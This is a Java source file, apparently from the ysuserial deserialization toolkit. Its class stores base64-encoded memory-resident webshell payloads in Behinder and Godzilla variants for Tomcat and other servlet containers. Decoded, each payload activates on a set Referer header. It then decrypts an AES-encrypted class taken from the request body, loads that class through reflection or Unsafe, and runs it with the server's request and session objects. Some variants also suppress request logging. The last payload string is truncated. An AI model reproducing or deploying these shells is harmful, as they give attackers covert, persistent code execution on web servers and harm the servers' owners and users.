package org.su18.ysuserial.payloads.templates;


/**
 * 这里懒得对封装代码做细化处理了，直接分成不同的储存，更方便看
 *
 * @author su18
 */
public class MemShellPayloads {

	public static String BEHINDER_SHELL_FOR_TOMCAT_OBSCURE = "ewoJCQlPYmplY3QgcmVxICA9ICQxOwoJCQlPYmplY3QgcmVzcCA9ICQyOwoJCQlPYmplY3QgbGFzdFJlcXVlc3QgID0gcmVxOwoJCQlPYmplY3QgbGFzdFJlc3BvbnNlID0gcmVzcDsKCQkJdHJ5IHsKCQkJCU9iamVjdCByZWZlcmVyID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldEhlYWRlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30sIG5ldyBPYmplY3RbXXsiUmVmZXJlciJ9KTsKCQkJCWlmIChyZWZlcmVyICE9IG51bGwgJiYgcmVmZXJlci50b1N0cmluZygpLmVxdWFsc0lnbm9yZUNhc2UoImh0dHBzOi8vc3UxOC5vcmcvIikpIHsKCQkJCQl0cnkgewoJCQkJCQlDbGFzcyByZXF1ZXN0RmFjYWRlQ2xhc3MgID0gQ2xhc3MuZm9yTmFtZSgib3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVxdWVzdEZhY2FkZSIsIHRydWUsIFRocmVhZC5jdXJyZW50VGhyZWFkKCkuZ2V0Q29udGV4dENsYXNzTG9hZGVyKCkpOwoJCQkJCQlDbGFzcyByZXNwb25zZUZhY2FkZUNsYXNzID0gQ2xhc3MuZm9yTmFtZSgib3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVzcG9uc2VGYWNhZGUiLCB0cnVlLCBUaHJlYWQuY3VycmVudFRocmVhZCgpLmdldENvbnRleHRDbGFzc0xvYWRlcigpKTsKCgkJCQkJCWlmICghKHJlcXVlc3RGYWNhZGVDbGFzcy5pc0Fzc2lnbmFibGVGcm9tKGxhc3RSZXF1ZXN0LmdldENsYXNzKCkpKSkgewoJCQkJCQkJbGFzdFJlcXVlc3QgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0UmVxdWVzdCIsIG51bGwsIG51bGwpOwoJCQkJCQkJd2hpbGUgKHRydWUpIHsKCQkJCQkJCQlpZiAocmVxdWVzdEZhY2FkZUNsYXNzLmlzQXNzaWduYWJsZUZyb20obGFzdFJlcXVlc3QuZ2V0Q2xhc3MoKSkpIGJyZWFrOwoJCQkJCQkJCWxhc3RSZXF1ZXN0ID0gZ2V0TWV0aG9kQW5kSW52b2tlKGxhc3RSZXF1ZXN0LCAiZ2V0UmVxdWVzdCIsIG51bGwsIG51bGwpOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCWlmICghKHJlc3BvbnNlRmFjYWRlQ2xhc3MuaXNBc3NpZ25hYmxlRnJvbShsYXN0UmVzcG9uc2UuZ2V0Q2xhc3MoKSkpKSB7CgkJCQkJCQlsYXN0UmVzcG9uc2UgPSBnZXRNZXRob2RBbmRJbnZva2UocmVzcCwgImdldFJlc3BvbnNlIiwgbnVsbCwgbnVsbCk7CgkJCQkJCQl3aGlsZSAodHJ1ZSkgewoJCQkJCQkJCWlmIChyZXNwb25zZUZhY2FkZUNsYXNzLmlzQXNzaWduYWJsZUZyb20obGFzdFJlc3BvbnNlLmdldENsYXNzKCkpKSBicmVhazsKCQkJCQkJCQlsYXN0UmVzcG9uc2UgPSBnZXRNZXRob2RBbmRJbnZva2UobGFzdFJlc3BvbnNlLCAiZ2V0UmVzcG9uc2UiLCBudWxsLCBudWxsKTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJCQkJfQoKCQkJCQlPYmplY3QgbWV0aG9kID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldE1ldGhvZCIsIG51bGwsIG51bGwpOwoJCQkJCWlmIChtZXRob2QgIT0gbnVsbCAmJiBtZXRob2QudG9TdHJpbmcoKS5lcXVhbHMoIlBPU1QiKSkgewoJCQkJCQlqYXZhLnV0aWwuSGFzaE1hcCBwYWdlQ29udGV4dCA9IG5ldyBqYXZhLnV0aWwuSGFzaE1hcCgpOwoJCQkJCQlPYmplY3QgICAgICAgICAgICBzZXNzaW9uICAgICA9IGdldE1ldGhvZEFuZEludm9rZShsYXN0UmVxdWVzdCwgImdldFNlc3Npb24iLCBudWxsLCBudWxsKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJyZXF1ZXN0IiwgbGFzdFJlcXVlc3QpOwoJCQkJCQlwYWdlQ29udGV4dC5wdXQoInJlc3BvbnNlIiwgbGFzdFJlc3BvbnNlKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJzZXNzaW9uIiwgc2Vzc2lvbik7CgoJCQkJCQlqYXZhLmxhbmcuU3RyaW5nQnVpbGRlciBwYXlsb2FkID0gbmV3IGphdmEubGFuZy5TdHJpbmdCdWlsZGVyKGdldE1ldGhvZEFuZEludm9rZShnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0UmVhZGVyIiwgbnVsbCwgbnVsbCksICJyZWFkTGluZSIsIG51bGwsIG51bGwpLnRvU3RyaW5nKCkpOwoJCQkJCQlpZiAocGF5bG9hZC5sZW5ndGgoKSA9PSAwKSB7CgkJCQkJCQlwYXlsb2FkID0gbmV3IGphdmEubGFuZy5TdHJpbmdCdWlsZGVyKCk7CgoJCQkJCQkJT2JqZWN0ICAgICAgICAgICAgICAgICAgY295b3RlUmVxdWVzdCA9IGdldEZpZWxkVmFsdWUoZ2V0RmllbGRWYWx1ZShsYXN0UmVxdWVzdCwgInJlcXVlc3QiKSwgImNveW90ZVJlcXVlc3QiKTsKCQkJCQkJCU9iamVjdCAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgICAgPSBnZXRNZXRob2RBbmRJbnZva2UoY295b3RlUmVxdWVzdCwgImdldFBhcmFtZXRlcnMiLCBudWxsLCBudWxsKTsKCQkJCQkJCWphdmEudXRpbC5MaW5rZWRIYXNoTWFwIHBhcmFtTWFwICAgICAgPSAoamF2YS51dGlsLkxpbmtlZEhhc2hNYXApIGdldEZpZWxkVmFsdWUocGFyYW1ldGVycywgInBhcmFtSGFzaFZhbHVlcyIpOwoJCQkJCQkJamF2YS51dGlsLkl0ZXJhdG9yICAgICAgaXRlcmF0b3IgICAgICA9IHBhcmFtTWFwLmVudHJ5U2V0KCkuaXRlcmF0b3IoKTsKCQkJCQkJCXdoaWxlIChpdGVyYXRvci5oYXNOZXh0KCkpIHsKCQkJCQkJCQlqYXZhLnV0aWwuTWFwLkVudHJ5IG5leHQgICAgICAgICAgID0gaXRlcmF0b3IubmV4dCgpOwoJCQkJCQkJCVN0cmluZyAgICAgICAgICAgICAgcGFyYW1LZXkgICAgICAgPSBuZXh0LmdldEtleSgpLnRvU3RyaW5nKCkucmVwbGFjZUFsbCgiICIsICIrIik7CgkJCQkJCQkJamF2YS51dGlsLkFycmF5TGlzdCBwYXJhbVZhbHVlTGlzdCA9IChqYXZhLnV0aWwuQXJyYXlMaXN0KSBuZXh0LmdldFZhbHVlKCk7CgkJCQkJCQkJaWYgKHBhcmFtVmFsdWVMaXN0LnNpemUoKSA9PSAwKSB7CgkJCQkJCQkJCXBheWxvYWQuYXBwZW5kKHBhcmFtS2V5KTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQlwYXlsb2FkLmFwcGVuZChwYXJhbUtleSkuYXBwZW5kKCI9IikuYXBwZW5kKHBhcmFtVmFsdWVMaXN0LmdldCgwKSk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCW5vTG9nKGxhc3RSZXF1ZXN0KTsKCQkJCQkJU3RyaW5nIGsgPSAiZjM1OTc0MGJkMWNkYTk5NCI7CgkJCQkJCWdldE1ldGhvZEFuZEludm9rZShzZXNzaW9uLCAicHV0VmFsdWUiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3MsIE9iamVjdC5jbGFzc30sIG5ldyBPYmplY3RbXXsidSIsIGt9KTsKCQkJCQkJamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CgkJCQkJCWMuaW5pdCgyLCBuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksICJBRVMiKSk7CgkJCQkJCWJ5dGVbXSBldmlsY2xhc3NfYnl0ZSA9IGMuZG9GaW5hbChiYXNlNjREZWNvZGUocGF5bG9hZC50b1N0cmluZygpKSk7CgkJCQkJCXN1bi5taXNjLlVuc2FmZSB1bnNhZmUgICAgICAgICA9IGdldFVuc2FmZSgpOwoJCQkJCQlDbGFzcyBldmlsY2xhc3MgPXVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhPYmplY3QuY2xhc3MsIGV2aWxjbGFzc19ieXRlLCBudWxsKTsKCQkJCQkJZXZpbGNsYXNzLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTsKCQkJCQl9CgkJCQl9CgkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJCX0KCQl9";

	public static String BEHINDER_SHELL_FOR_TOMCAT = "ewoJCQlPYmplY3QgcmVxICA9ICQxOwoJCQlPYmplY3QgcmVzcCA9ICQyOwoJCQlPYmplY3QgbGFzdFJlcXVlc3QgID0gcmVxOwoJCQlPYmplY3QgbGFzdFJlc3BvbnNlID0gcmVzcDsKCQkJdHJ5IHsKCQkJCU9iamVjdCByZWZlcmVyID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldEhlYWRlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30sIG5ldyBPYmplY3RbXXsiUmVmZXJlciJ9KTsKCQkJCWlmIChyZWZlcmVyICE9IG51bGwgJiYgcmVmZXJlci50b1N0cmluZygpLmVxdWFsc0lnbm9yZUNhc2UoImh0dHBzOi8vc3UxOC5vcmcvIikpIHsKCQkJCQl0cnkgewoJCQkJCQlDbGFzcyByZXF1ZXN0RmFjYWRlQ2xhc3MgID0gQ2xhc3MuZm9yTmFtZSgib3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVxdWVzdEZhY2FkZSIsIHRydWUsIFRocmVhZC5jdXJyZW50VGhyZWFkKCkuZ2V0Q29udGV4dENsYXNzTG9hZGVyKCkpOwoJCQkJCQlDbGFzcyByZXNwb25zZUZhY2FkZUNsYXNzID0gQ2xhc3MuZm9yTmFtZSgib3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVzcG9uc2VGYWNhZGUiLCB0cnVlLCBUaHJlYWQuY3VycmVudFRocmVhZCgpLmdldENvbnRleHRDbGFzc0xvYWRlcigpKTsKCgkJCQkJCWlmICghKHJlcXVlc3RGYWNhZGVDbGFzcy5pc0Fzc2lnbmFibGVGcm9tKGxhc3RSZXF1ZXN0LmdldENsYXNzKCkpKSkgewoJCQkJCQkJbGFzdFJlcXVlc3QgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0UmVxdWVzdCIsIG51bGwsIG51bGwpOwoJCQkJCQkJd2hpbGUgKHRydWUpIHsKCQkJCQkJCQlpZiAocmVxdWVzdEZhY2FkZUNsYXNzLmlzQXNzaWduYWJsZUZyb20obGFzdFJlcXVlc3QuZ2V0Q2xhc3MoKSkpIGJyZWFrOwoJCQkJCQkJCWxhc3RSZXF1ZXN0ID0gZ2V0TWV0aG9kQW5kSW52b2tlKGxhc3RSZXF1ZXN0LCAiZ2V0UmVxdWVzdCIsIG51bGwsIG51bGwpOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCWlmICghKHJlc3BvbnNlRmFjYWRlQ2xhc3MuaXNBc3NpZ25hYmxlRnJvbShsYXN0UmVzcG9uc2UuZ2V0Q2xhc3MoKSkpKSB7CgkJCQkJCQlsYXN0UmVzcG9uc2UgPSBnZXRNZXRob2RBbmRJbnZva2UocmVzcCwgImdldFJlc3BvbnNlIiwgbnVsbCwgbnVsbCk7CgkJCQkJCQl3aGlsZSAodHJ1ZSkgewoJCQkJCQkJCWlmIChyZXNwb25zZUZhY2FkZUNsYXNzLmlzQXNzaWduYWJsZUZyb20obGFzdFJlc3BvbnNlLmdldENsYXNzKCkpKSBicmVhazsKCQkJCQkJCQlsYXN0UmVzcG9uc2UgPSBnZXRNZXRob2RBbmRJbnZva2UobGFzdFJlc3BvbnNlLCAiZ2V0UmVzcG9uc2UiLCBudWxsLCBudWxsKTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJCQkJfQoKCQkJCQlPYmplY3QgbWV0aG9kID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldE1ldGhvZCIsIG51bGwsIG51bGwpOwoJCQkJCWlmIChtZXRob2QgIT0gbnVsbCAmJiBtZXRob2QudG9TdHJpbmcoKS5lcXVhbHMoIlBPU1QiKSkgewoJCQkJCQlqYXZhLnV0aWwuSGFzaE1hcCBwYWdlQ29udGV4dCA9IG5ldyBqYXZhLnV0aWwuSGFzaE1hcCgpOwoJCQkJCQlPYmplY3QgICAgICAgICAgICBzZXNzaW9uICAgICA9IGdldE1ldGhvZEFuZEludm9rZShsYXN0UmVxdWVzdCwgImdldFNlc3Npb24iLCBudWxsLCBudWxsKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJyZXF1ZXN0IiwgbGFzdFJlcXVlc3QpOwoJCQkJCQlwYWdlQ29udGV4dC5wdXQoInJlc3BvbnNlIiwgbGFzdFJlc3BvbnNlKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJzZXNzaW9uIiwgc2Vzc2lvbik7CgoJCQkJCQlqYXZhLmxhbmcuU3RyaW5nQnVpbGRlciBwYXlsb2FkID0gbmV3IGphdmEubGFuZy5TdHJpbmdCdWlsZGVyKGdldE1ldGhvZEFuZEludm9rZShnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0UmVhZGVyIiwgbnVsbCwgbnVsbCksICJyZWFkTGluZSIsIG51bGwsIG51bGwpLnRvU3RyaW5nKCkpOwoJCQkJCQlpZiAocGF5bG9hZC5sZW5ndGgoKSA9PSAwKSB7CgkJCQkJCQlwYXlsb2FkID0gbmV3IGphdmEubGFuZy5TdHJpbmdCdWlsZGVyKCk7CgoJCQkJCQkJT2JqZWN0ICAgICAgICAgICAgICAgICAgY295b3RlUmVxdWVzdCA9IGdldEZpZWxkVmFsdWUoZ2V0RmllbGRWYWx1ZShsYXN0UmVxdWVzdCwgInJlcXVlc3QiKSwgImNveW90ZVJlcXVlc3QiKTsKCQkJCQkJCU9iamVjdCAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgICAgPSBnZXRNZXRob2RBbmRJbnZva2UoY295b3RlUmVxdWVzdCwgImdldFBhcmFtZXRlcnMiLCBudWxsLCBudWxsKTsKCQkJCQkJCWphdmEudXRpbC5MaW5rZWRIYXNoTWFwIHBhcmFtTWFwICAgICAgPSAoamF2YS51dGlsLkxpbmtlZEhhc2hNYXApIGdldEZpZWxkVmFsdWUocGFyYW1ldGVycywgInBhcmFtSGFzaFZhbHVlcyIpOwoJCQkJCQkJamF2YS51dGlsLkl0ZXJhdG9yICAgICAgaXRlcmF0b3IgICAgICA9IHBhcmFtTWFwLmVudHJ5U2V0KCkuaXRlcmF0b3IoKTsKCQkJCQkJCXdoaWxlIChpdGVyYXRvci5oYXNOZXh0KCkpIHsKCQkJCQkJCQlqYXZhLnV0aWwuTWFwLkVudHJ5IG5leHQgICAgICAgICAgID0gaXRlcmF0b3IubmV4dCgpOwoJCQkJCQkJCVN0cmluZyAgICAgICAgICAgICAgcGFyYW1LZXkgICAgICAgPSBuZXh0LmdldEtleSgpLnRvU3RyaW5nKCkucmVwbGFjZUFsbCgiICIsICIrIik7CgkJCQkJCQkJamF2YS51dGlsLkFycmF5TGlzdCBwYXJhbVZhbHVlTGlzdCA9IChqYXZhLnV0aWwuQXJyYXlMaXN0KSBuZXh0LmdldFZhbHVlKCk7CgkJCQkJCQkJaWYgKHBhcmFtVmFsdWVMaXN0LnNpemUoKSA9PSAwKSB7CgkJCQkJCQkJCXBheWxvYWQuYXBwZW5kKHBhcmFtS2V5KTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQlwYXlsb2FkLmFwcGVuZChwYXJhbUtleSkuYXBwZW5kKCI9IikuYXBwZW5kKHBhcmFtVmFsdWVMaXN0LmdldCgwKSk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCW5vTG9nKGxhc3RSZXF1ZXN0KTsKCQkJCQkJU3RyaW5nIGsgPSAiZjM1OTc0MGJkMWNkYTk5NCI7CgkJCQkJCWdldE1ldGhvZEFuZEludm9rZShzZXNzaW9uLCAicHV0VmFsdWUiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3MsIE9iamVjdC5jbGFzc30sIG5ldyBPYmplY3RbXXsidSIsIGt9KTsKCQkJCQkJamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CgkJCQkJCWMuaW5pdCgyLCBuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksICJBRVMiKSk7CgkJCQkJCWphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBtZXRob2QgPSBDbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3NMb2FkZXIiKS5nZXREZWNsYXJlZE1ldGhvZCgiZGVmaW5lQ2xhc3MiLCBuZXcgQ2xhc3NbXXtieXRlW10uY2xhc3MsIGludC5jbGFzcywgaW50LmNsYXNzfSk7CgkJCQkJCW1ldGhvZC5zZXRBY2Nlc3NpYmxlKHRydWUpOwoJCQkJCQlieXRlW10gZXZpbGNsYXNzX2J5dGUgPSBjLmRvRmluYWwoYmFzZTY0RGVjb2RlKHBheWxvYWQudG9TdHJpbmcoKSkpOwoJCQkJCQlDbGFzcyAgZXZpbGNsYXNzICAgICAgPSAoQ2xhc3MpIG1ldGhvZC5pbnZva2UoVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS5nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSwgbmV3IE9iamVjdFtde2V2aWxjbGFzc19ieXRlLCBJbnRlZ2VyLnZhbHVlT2YoMCksIEludGVnZXIudmFsdWVPZihldmlsY2xhc3NfYnl0ZS5sZW5ndGgpfSk7CgkJCQkJCWV2aWxjbGFzcy5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CgkJCQkJfQoJCQkJfQoJCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJCQl9CgkJfQ==";

	public static String BEHINDER_SHELL = "ewoJCQlPYmplY3QgcmVxICA9ICQxOwoJCQlPYmplY3QgcmVzcCA9ICQyOwoJCQl0cnkgewoJCQkJT2JqZWN0IHJlZmVyZXIgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0SGVhZGVyIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtdeyJSZWZlcmVyIn0pOwoJCQkJaWYgKHJlZmVyZXIgIT0gbnVsbCAmJiByZWZlcmVyLnRvU3RyaW5nKCkuZXF1YWxzSWdub3JlQ2FzZSgiaHR0cHM6Ly9zdTE4Lm9yZy8iKSkgewoJCQkJCU9iamVjdCBtZXRob2QgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0TWV0aG9kIiwgbnVsbCwgbnVsbCk7CgkJCQkJaWYgKG1ldGhvZCAhPSBudWxsICYmIG1ldGhvZC50b1N0cmluZygpLmVxdWFscygiUE9TVCIpKSB7CgkJCQkJCWphdmEudXRpbC5IYXNoTWFwIHBhZ2VDb250ZXh0ID0gbmV3IGphdmEudXRpbC5IYXNoTWFwKCk7CgkJCQkJCU9iamVjdCAgICAgICAgICAgIHNlc3Npb24gICAgID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldFNlc3Npb24iLCBudWxsLCBudWxsKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJyZXF1ZXN0IiwgcmVxKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJyZXNwb25zZSIsIHJlc3ApOwoJCQkJCQlwYWdlQ29udGV4dC5wdXQoInNlc3Npb24iLCBzZXNzaW9uKTsKCQkJCQkJamF2YS5sYW5nLlN0cmluZ0J1aWxkZXIgcGF5bG9hZCA9IG5ldyBqYXZhLmxhbmcuU3RyaW5nQnVpbGRlcihnZXRNZXRob2RBbmRJbnZva2UoZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldFJlYWRlciIsIG51bGwsIG51bGwpLCAicmVhZExpbmUiLCBudWxsLCBudWxsKS50b1N0cmluZygpKTsKCQkJCQkJU3RyaW5nIGsgPSAiZjM1OTc0MGJkMWNkYTk5NCI7CgkJCQkJCWdldE1ldGhvZEFuZEludm9rZShzZXNzaW9uLCAicHV0VmFsdWUiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3MsIE9iamVjdC5jbGFzc30sIG5ldyBPYmplY3RbXXsidSIsIGt9KTsKCQkJCQkJamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CgkJCQkJCWMuaW5pdCgyLCBuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksICJBRVMiKSk7CgkJCQkJCWphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBtZXRob2QgPSBDbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3NMb2FkZXIiKS5nZXREZWNsYXJlZE1ldGhvZCgiZGVmaW5lQ2xhc3MiLCBuZXcgQ2xhc3NbXXtieXRlW10uY2xhc3MsIGludC5jbGFzcywgaW50LmNsYXNzfSk7CgkJCQkJCW1ldGhvZC5zZXRBY2Nlc3NpYmxlKHRydWUpOwoJCQkJCQlieXRlW10gZXZpbGNsYXNzX2J5dGUgPSBjLmRvRmluYWwoYmFzZTY0RGVjb2RlKHBheWxvYWQudG9TdHJpbmcoKSkpOwoJCQkJCQlDbGFzcyAgZXZpbGNsYXNzICAgICAgPSAoQ2xhc3MpIG1ldGhvZC5pbnZva2UoVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS5nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSwgbmV3IE9iamVjdFtde2V2aWxjbGFzc19ieXRlLCBJbnRlZ2VyLnZhbHVlT2YoMCksIEludGVnZXIudmFsdWVPZihldmlsY2xhc3NfYnl0ZS5sZW5ndGgpfSk7CgkJCQkJCWV2aWxjbGFzcy5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CgkJCQkJfQoJCQkJfQoJCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJCQl9CgkJfQ==";

	public static String BEHINDER_SHELL_OBSCURE = "ewoJCQlPYmplY3QgcmVxICA9ICQxOwoJCQlPYmplY3QgcmVzcCA9ICQyOwoJCQl0cnkgewoJCQkJT2JqZWN0IHJlZmVyZXIgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0SGVhZGVyIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtdeyJSZWZlcmVyIn0pOwoJCQkJaWYgKHJlZmVyZXIgIT0gbnVsbCAmJiByZWZlcmVyLnRvU3RyaW5nKCkuZXF1YWxzSWdub3JlQ2FzZSgiaHR0cHM6Ly9zdTE4Lm9yZy8iKSkgewoJCQkJCU9iamVjdCBtZXRob2QgPSBnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0TWV0aG9kIiwgbnVsbCwgbnVsbCk7CgkJCQkJaWYgKG1ldGhvZCAhPSBudWxsICYmIG1ldGhvZC50b1N0cmluZygpLmVxdWFscygiUE9TVCIpKSB7CgkJCQkJCWphdmEudXRpbC5IYXNoTWFwIHBhZ2VDb250ZXh0ID0gbmV3IGphdmEudXRpbC5IYXNoTWFwKCk7CgkJCQkJCU9iamVjdCAgICAgICAgICAgIHNlc3Npb24gICAgID0gZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldFNlc3Npb24iLCBudWxsLCBudWxsKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJyZXF1ZXN0IiwgcmVxKTsKCQkJCQkJcGFnZUNvbnRleHQucHV0KCJyZXNwb25zZSIsIHJlc3ApOwoJCQkJCQlwYWdlQ29udGV4dC5wdXQoInNlc3Npb24iLCBzZXNzaW9uKTsKCQkJCQkJamF2YS5sYW5nLlN0cmluZ0J1aWxkZXIgcGF5bG9hZCA9IG5ldyBqYXZhLmxhbmcuU3RyaW5nQnVpbGRlcihnZXRNZXRob2RBbmRJbnZva2UoZ2V0TWV0aG9kQW5kSW52b2tlKHJlcSwgImdldFJlYWRlciIsIG51bGwsIG51bGwpLCAicmVhZExpbmUiLCBudWxsLCBudWxsKS50b1N0cmluZygpKTsKCQkJCQkJU3RyaW5nIGsgPSAiZjM1OTc0MGJkMWNkYTk5NCI7CgkJCQkJCWdldE1ldGhvZEFuZEludm9rZShzZXNzaW9uLCAicHV0VmFsdWUiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3MsIE9iamVjdC5jbGFzc30sIG5ldyBPYmplY3RbXXsidSIsIGt9KTsKCQkJCQkJamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CgkJCQkJCWMuaW5pdCgyLCBuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksICJBRVMiKSk7CgkJCQkJCWJ5dGVbXSBldmlsY2xhc3NfYnl0ZSA9IGMuZG9GaW5hbChiYXNlNjREZWNvZGUocGF5bG9hZC50b1N0cmluZygpKSk7CgkJCQkJCXN1bi5taXNjLlVuc2FmZSB1bnNhZmUgICAgICAgICA9IGdldFVuc2FmZSgpOwoJCQkJCQlDbGFzcyBldmlsY2xhc3MgPXVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhPYmplY3QuY2xhc3MsIGV2aWxjbGFzc19ieXRlLCBudWxsKTsKCQkJCQkJZXZpbGNsYXNzLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTsKCQkJCQl9CgkJCQl9CgkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJCX0KCQl9";

	public static String GODZILLA_SHELL = "ewoJCQl0cnkgewoJCQkJT2JqZWN0IHJlcSAgPSAkMTsKCQkJCU9iamVjdCByZXNwID0gJDI7CgkJCQlPYmplY3QgcmVmZXJlciA9IGdldE1ldGhvZEFuZEludm9rZShyZXEsICJnZXRIZWFkZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9LCBuZXcgT2JqZWN0W117IlJlZmVyZXIifSk7CgkJCQlpZiAocmVmZXJlciAhPSBudWxsICYmIHJlZmVyZXIudG9TdHJpbmcoKS5lcXVhbHNJZ25vcmVDYXNlKCJodHRwczovL3N1MTgub3JnLyIpKSB7CgkJCQkJU3RyaW5nIHBhc3MgPSAic3UxOCI7CgkJCQkJU3RyaW5nIG1kNSAgPSBtZDUocGFzcyArIHhjKTsKCQkJCQlieXRlW10gZGF0YSA9IGJhc2U2NERlY29kZShnZXRNZXRob2RBbmRJbnZva2UocmVxLCAiZ2V0UGFyYW1ldGVyIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSwgbmV3IE9iamVjdFtde3Bhc3N9KS50b1N0cmluZygpKTsKCQkJCQlkYXRhID0geChkYXRhLCBmYWxzZSk7CgkJCQkJaWYgKHBheWxvYWQgPT0gbnVsbCkgewoJCQkJCQlqYXZhLm5ldC5VUkxDbGFzc0xvYWRlciAgdXJsQ2xhc3NMb2FkZXIgPSBuZXcgamF2YS5uZXQuVVJMQ2xhc3NMb2FkZXIobmV3IGphdmEubmV0LlVSTFswXSwgVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS5nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSk7CgkJCQkJCWphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCBkZWZNZXRob2QgICAgICA9IENsYXNzTG9hZGVyLmNsYXNzLmdldERlY2xhcmVkTWV0aG9kKCJkZWZpbmVDbGFzcyIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzcywgaW50LmNsYXNzLCBpbnQuY2xhc3N9KTsKCQkJCQkJZGVmTWV0aG9kLnNldEFjY2Vzc2libGUodHJ1ZSk7CgkJCQkJCXBheWxvYWQgPSAoQ2xhc3MpIGRlZk1ldGhvZC5pbnZva2UodXJsQ2xhc3NMb2FkZXIsIG5ldyBPYmplY3RbXXtkYXRhLCBJbnRlZ2VyLnZhbHVlT2YoMCksIEludGVnZXIudmFsdWVPZihkYXRhLmxlbmd0aCl9KTsKCQkJCQl9IGVsc2UgewoJCQkJCQlqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQgPSBuZXcgamF2YS5pby5CeXRlQXJyYXlPdXRwdXRTd